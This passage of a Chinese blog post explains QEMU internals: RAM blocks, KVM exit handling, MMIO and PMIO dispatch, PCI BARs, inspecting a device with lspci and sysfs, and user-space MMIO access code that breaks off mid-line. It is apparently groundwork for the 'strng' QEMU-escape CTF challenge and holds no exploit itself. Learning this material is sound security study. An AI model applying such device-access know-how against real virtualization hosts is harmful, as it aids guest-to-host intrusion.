*clear_bmap;</span><br><span class="line">    <span class="type">uint8_t</span> clear_bmap_shift;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RAM block length that corresponds to the used_length on the migration</span></span><br><span class="line"><span class="comment">     * source (after RAM block sizes were synchronized). Especially, after</span></span><br><span class="line"><span class="comment">     * starting to run the guest, used_length and postcopy_length can differ.</span></span><br><span class="line"><span class="comment">     * Used to register/unregister uffd handlers and as the size of the received</span></span><br><span class="line"><span class="comment">     * bitmap. Receiving any page beyond this length will bail out, as it</span></span><br><span class="line"><span class="comment">     * could not have been valid on the source.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> postcopy_length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对应关系如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_211915.png" alt=""></p><h2 id="设备模型"><a href="#设备模型" class="headerlink" title="设备模型"></a>设备模型</h2><p>QEMU 在用户空间中独立进行设备模拟，虚拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p><h3 id="IO处理"><a href="#IO处理" class="headerlink" title="IO处理"></a>IO处理</h3><p>当 VM 在访问某一虚拟设备对应的物理内存 / 端口时，控制权由 VM 转交到 Hypervisor，此时 QEMU 会根据触发 VM-exit 的事件类型进行不同的处理。</p><blockquote><p>accel/kvm/kvm-all.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kvm_cpu_exec</span><span class="params">(CPUState *cpu)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VCPU 退出运行，处理对应事件</span></span><br><span class="line"></span><br><span class="line">        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_io\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            kvm_handle_io(run-&gt;io.port, attrs,</span><br><span class="line">                          (<span class="type">uint8_t</span> *)run + run-&gt;io.data_offset,</span><br><span class="line">                          run-&gt;io.direction,</span><br><span class="line">                          run-&gt;io.size,</span><br><span class="line">                          run-&gt;io.count);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_MMIO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_mmio\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            address_space_rw(&amp;address_space_memory,</span><br><span class="line">                             run-&gt;mmio.phys_addr, attrs,</span><br><span class="line">                             run-&gt;mmio.data,</span><br><span class="line">                             run-&gt;mmio.len,</span><br><span class="line">                             run-&gt;mmio.is_write);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h4><p>对于 MMIO 而言会调用到 <code>address_space_rw()</code> 函数，该函数会先将全局地址空间 <code>address_space_memory</code> 展开成 <code>FlatView</code> 后再调用对应的函数进行读写操作。</p><blockquote><p>softmmu/physmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">MemTxResult <span class="title function_">address_space_read_full</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                    MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_read(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_write</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_write(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_rw</span><span class="params">(AddressSpace *as, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                             <span class="type">void</span> *buf, hwaddr len, <span class="type">bool</span> is_write)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_write) &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作函数最后会根据 <code>FlatView</code> 找到目标内存对应的 <code>MemoryRegion</code>，对于函数表中定义了读写指针的 MR 而言最后会调用对应的函数指针完成内存访问工作，代码过多这里就不继续展开了：</p><blockquote><p>softmmu/physmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_write</span><span class="params">(FlatView *fv, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                  <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">true</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_write_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                   addr1, l, mr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_read</span><span class="params">(FlatView *fv, hwaddr addr,</span></span><br><span class="line"><span class="params">                                 MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">false</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_read_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                  addr1, l, mr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h4><p>对于 <code>PMIO</code> 而言会调用到 <code>kvm_handle_io()</code> 函数，该函数实际上也是对 <code>address_space_rw()</code> 的封装，只不过使用的是<strong>端口地址空间</strong> <code>address_space_io</code>，最后也会调用到对应 <code>MemoryRegion</code> 的函数表中的读写函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_handle_io</span><span class="params">(<span class="type">uint16_t</span> port, MemTxAttrs attrs, <span class="type">void</span> *data, <span class="type">int</span> direction,</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> size, <span class="type">uint32_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        address_space_rw(&amp;address_space_io, port, attrs,</span><br><span class="line">                         ptr, size,</span><br><span class="line">                         direction == KVM_EXIT_IO_OUT);</span><br><span class="line">        ptr += size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pci设备地址空间"><a href="#pci设备地址空间" class="headerlink" title="pci设备地址空间"></a>pci设备地址空间</h2><blockquote><p>PCI（Peripheral Component Interconnect，外设组件互联）设备是一种计算机硬件设备，通过PCI总线与计算机的主板连接。PCI设备可以包括各种外部设备，如网卡、显卡、声卡、硬盘控制器、USB控制器等。PCI设备可以直接与计算机的主板连接，或者通过PCI插槽连接到主板上。PCI总线是一种高速数据传输接口，使得PCI设备可以与计算机进行快速的数据交换，从而实现各种输入输出功能。PCI设备的规范已经被不断发展和扩展，其中包括PCI Express（PCIe）等更高性能的接口。</p></blockquote><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-19_163506.png" alt=""></p><p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-19_163623.png" alt=""></p><p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。</p><p>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</p><p>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即<strong>MMIO</strong>，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，即<strong>PMIO</strong>,这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p><p>关于MMIO和PMIO，维基百科的描述是：</p><blockquote><p>Memory-mapped I/O (MMIO) and port-mapped I/O (PMIO) (which is also called isolated I/O) are two complementary methods of performing input/output (I/O) between the central processing unit (CPU) and peripheral devices in a computer. An alternative approach is using dedicated I/O processors, commonly known as channels on mainframe computers, which execute their own instructions.</p><p>翻译来自谷歌</p><p>内存映射 I/O (MMIO) 和端口映射 I/O (PMIO)（也称为隔离 I/O）是在中央处理单元 (CPU) 之间执行输入/输出 (I/O) 的两种互补方法。 ）和计算机中的外围设备。 另一种方法是使用专用 I/O 处理器，通常称为大型计算机上的通道，它们执行自己的指令。</p></blockquote><p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p><p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p><h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>下面通过在qemu虚拟机中查看pci设备来进一步增进理解，仍然是基于strng这道题的qemu虚拟机。</p><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p><p>pci设备的寻址是由总线、设备以及功能构成。如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><p>可以使用lspci命令以树状的形式输出pci结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -t -v</span><br><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure><p>其中<code>[0000]</code>表示pci的域， PCI域最多可以承载256条总线。 每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p><p>总之每个 PCI 设备有一个总线号, 一个设备号, 一个功能号标识。PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p><p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  00ff</span><br><span class="line">Vendor: 1234</span><br><span class="line">Device: 11e9</span><br><span class="line">SVendor:        1af4</span><br><span class="line">SDevice:        1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  Unclassified device [00ff]</span><br><span class="line">Vendor: Vendor 1234</span><br><span class="line">Device: Device 11e9</span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device 1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure><p>查看设备内存空间：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为<code>febf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p><h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h2><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或在用户空间编程进行访问。</p><h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译内核模块，在内核态访问mmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | 